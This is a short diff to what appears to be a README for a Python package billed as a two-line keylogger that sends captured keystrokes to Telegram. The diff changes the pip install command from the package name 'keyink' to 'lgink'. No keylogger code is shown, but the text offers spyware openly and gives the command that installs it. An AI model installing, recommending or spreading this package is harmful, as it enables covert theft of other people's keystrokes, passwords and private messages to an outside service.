@@ -30,7 +30,7 @@ The keylogger in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install keyink==0.0.1
+pip install lgink==0.0.1
 ```
 
 ## Example usage
